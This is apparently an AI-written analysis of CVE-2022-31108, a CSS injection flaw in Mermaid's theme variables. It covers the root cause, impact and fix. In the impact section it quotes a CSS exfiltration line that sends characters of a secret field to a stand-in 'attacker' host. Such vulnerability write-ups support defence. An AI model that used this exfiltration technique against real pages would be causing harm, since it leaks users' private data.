Based on the provided information, here's a breakdown of the vulnerability:

**CVE ID:** CVE-2022-31108

**Root Cause:**
The vulnerability stems from the lack of proper sanitization of user-provided theme variables within the Mermaid library. Specifically, the `textColor`, `fontFamily` and `themeCSS` variables were not being sanitized before being embedded into CSS blocks, allowing for arbitrary CSS injection.

**Weaknesses/Vulnerabilities:**
- CSS Injection: The primary vulnerability is the ability to inject arbitrary CSS rules into the generated SVG, which allows styling of elements outside the intended scope of the diagram. This was possible via the `themeVariables` settings such as `textColor` and also `fontFamily`.

**Impact of Exploitation:**
- **Information Disclosure:** Attackers could exfiltrate sensitive data by leveraging CSS selectors and functions that trigger HTTP requests (e.g., using `background-image: url(http://attacker/?char=x);` to send data to an external server). The example provided shows how an attacker can bruteforce the content of a secret input field.
- **UI manipulation**: Attackers can alter the appearance of the page, potentially leading to phishing attacks or tricking users into performing unintended actions (e.g., clicking on a malicious link).

**Attack Vectors:**
- By crafting a malicious diagram definition with specific values in the `themeVariables` settings.

**Required Attacker Capabilities/Position:**
- The attacker must be able to supply a crafted diagram definition to the Mermaid library, this could be through any mechanism that utilizes mermaid.
- No specific user level privileges are required, exploitation is possible if the attacker can control the input to mermaid.

**Additional Details:**
- The vulnerability was present in versions 8+ of the Mermaid library and was fixed in version 9.1.2
- The vulnerability is present in multiple locations, including `src/styles.js`, `src/mermaidAPI.js` and potentially other injection points within the code.
- The fix implemented sanitization to ensure that user inputs are properly escaped before being embedded into CSS blocks. The sanitizer will remove invalid characters from `themeVariables`. It also ensures that the number of open curly brackets `{` matches the number of closing curly brackets `}`.
- The commit `0ae1bdb61adff1cd485caff8c62ec6b8ac57b225` addresses this vulnerability.
- The commit contains test cases (ghsa.spec.js) as well as new html files (`ghsa1.html`, `ghsa2.html`) which show how the vulnerability can be triggered.
